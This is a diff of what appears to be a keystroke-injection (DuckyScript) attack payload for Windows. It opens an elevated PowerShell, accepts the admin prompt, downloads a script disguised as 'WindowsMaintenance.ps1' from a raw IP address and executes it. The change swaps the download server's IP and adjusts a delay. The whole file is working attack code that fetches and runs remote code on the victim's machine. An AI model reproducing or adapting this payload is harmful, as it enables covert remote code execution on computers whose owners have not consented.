@@ -3,7 +3,7 @@ CTRL ESC
 DELAY 1000
 STRING powershell
 CTRL-SHIFT ENTER
-DELAY 1000
+DELAY 2000
 LEFT
 ENTER
 DELAY 2000
@@ -16,7 +16,7 @@ DELAY 1000
 STRING y
 ENTER
 DELAY 1000
-STRING (New-Object System.Net.WebClient).DownloadFile('http://107.170.253.173/WindowsMaintenance.ps1', "$ENV:SYSTEMDRIVE\WindowsMaintenance.ps1")
+STRING (New-Object System.Net.WebClient).DownloadFile('http://35.202.213.171/WindowsMaintenance.ps1', "$ENV:SYSTEMDRIVE\WindowsMaintenance.ps1")
 ENTER
 DELAY 5000
 STRING .\WindowsMaintenance.ps1
